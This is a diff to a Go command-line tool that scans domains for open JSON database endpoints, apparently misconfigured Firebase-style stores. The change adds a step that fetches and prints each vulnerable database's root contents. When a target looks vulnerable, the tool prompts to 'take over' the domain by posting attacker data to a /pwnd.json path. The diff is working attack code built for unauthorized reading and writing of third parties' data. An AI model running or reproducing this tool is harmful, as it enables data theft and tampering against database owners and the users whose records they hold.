@@ -17,6 +17,20 @@ type ExploitData struct {
 	Email   string `json:"email"`
 }
 
+func WarnaCampuran(domain string, statusCode int, KayanyaRentan bool) {
+	domainColor := "\033[1;36m"
+	statusColor := "\033[1;33m"
+	vulnColor := "\033[1;32m"
+	notVulnColor := "\033[1;34m"
+
+	fmt.Printf("[+] %s[%s]%s [%s%d%s]\n", domainColor, domain, "\033[0m", statusColor, statusCode, "\033[0m")
+	if KayanyaRentan {
+		fmt.Printf("\t[%s/testing.json] -> %sseems vulnerable\033[0m\n", domain, vulnColor)
+	} else {
+		fmt.Printf("\t[%s/testing.json] -> %sseems not vulnerable\033[0m\n", domain, notVulnColor)
+	}
+}
+
 func main() {
 	printBanner()
 
@@ -50,11 +64,14 @@ func main() {
 			continue
 		}
 
-		statusCode, isVulnerable := scanDomain(domain)
-		printStatus(domain, statusCode, isVulnerable)
+		statusCode, KayanyaRentan := cek123(domain)
+		WarnaCampuran(domain, statusCode, KayanyaRentan)
 
-		if isVulnerable {
-			fmt.Printf("\t[?] %s is vulnerable. Do you want to take over? (y/n): ", domain)
+		if KayanyaRentan {
+			snippet := getFormattedSnippet(domain)
+			fmt.Println(snippet)
+
+			fmt.Printf("\n[?] %s is vulnerable. Do you want to take over? (y/n): ", domain)
 			var choice string
 			fmt.Scanln(&choice)
 			choice = strings.ToLower(strings.TrimSpace(choice))
@@ -68,13 +85,8 @@ func main() {
 	}
 }
 
-func scanDomain(domain string) (int, bool) {
-	var url string
-	if strings.HasPrefix(domain, "https://") || strings.HasPrefix(domain, "http://") {
-		url = fmt.Sprintf("%s/testing.json", domain)
-	} else {
-		url = fmt.Sprintf("https://%s/testing.json", domain)
-	}
+func cek123(domain string) (int, bool) {
+	url := fmt.Sprintf("https://%s/testing.json", strings.TrimPrefix(strings.TrimPrefix(domain, "https://"), "http://"))
 
 	resp, err := http.Get(url)
 	if err != nil {
@@ -92,35 +104,35 @@ func scanDomain(domain string) (int, bool) {
 	return resp.StatusCode, false
 }
 
-func printStatus(domain string, statusCode int, isVulnerable bool) {
-	var statusColor, vulnColor string
-	if statusCode == 200 {
-		statusColor = "\033[1;33m"
-	} else {
-		statusColor = "\033[1;34m"
+func getFormattedSnippet(domain string) string {
+	url := fmt.Sprintf("https://%s/.json", strings.TrimPrefix(strings.TrimPrefix(domain, "https://"), "http://"))
+
+	resp, err := http.Get(url)
+	if err != nil {
+		return fmt.Sprintf("\t\033[1;31mError fetching JSON: %v\033[0m", err)
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(resp.Body)
+
+	var prettyJSON bytes.Buffer
+	err = json.Indent(&prettyJSON, body, "", "    ")
+	if err != nil {
+		return fmt.Sprintf("\t\033[1;31mError formatting JSON: %v\033[0m", err)
 	}
 
-	if isVulnerable {
-		vulnColor = "\033[1;32m"
-	} else {
-		vulnColor = "\033[1;34m"
+	snippetLines := strings.Split(prettyJSON.String(), "\n")
+	formattedSnippet := "|\n|  [+] snippet:\n|  {\n"
+	for _, line := range snippetLines {
+		formattedSnippet += "|    " + line + "\n"
 	}
+	formattedSnippet += "|  }\n|"
 
-	fmt.Printf("[+] \033[0m[%s] %s[%d]\033[0m\n", domain, statusColor, statusCode)
-	if isVulnerable {
-		fmt.Printf("\t[%s/testing.json] -> %sseems vulnerable\033[0m\n", domain, vulnColor)
-	} else {
-		fmt.Printf("\t[%s/testing.json] -> %sseems not vulnerable\033[0m\n", domain, vulnColor)
-	}
+	return formattedSnippet
 }
 
 func exploit(domain string, data ExploitData) {
-	var url string
-	if strings.HasPrefix(domain, "https://") || strings.HasPrefix(domain, "http://") {
-		url = fmt.Sprintf("%s/pwnd.json", domain)
-	} else {
-		url = fmt.Sprintf("https://%s/pwnd.json", domain)
-	}
+	url := fmt.Sprintf("https://%s/pwnd.json", strings.TrimPrefix(strings.TrimPrefix(domain, "https://"), "http://"))
 
 	jsonData, err := json.Marshal(data)
 	if err != nil {
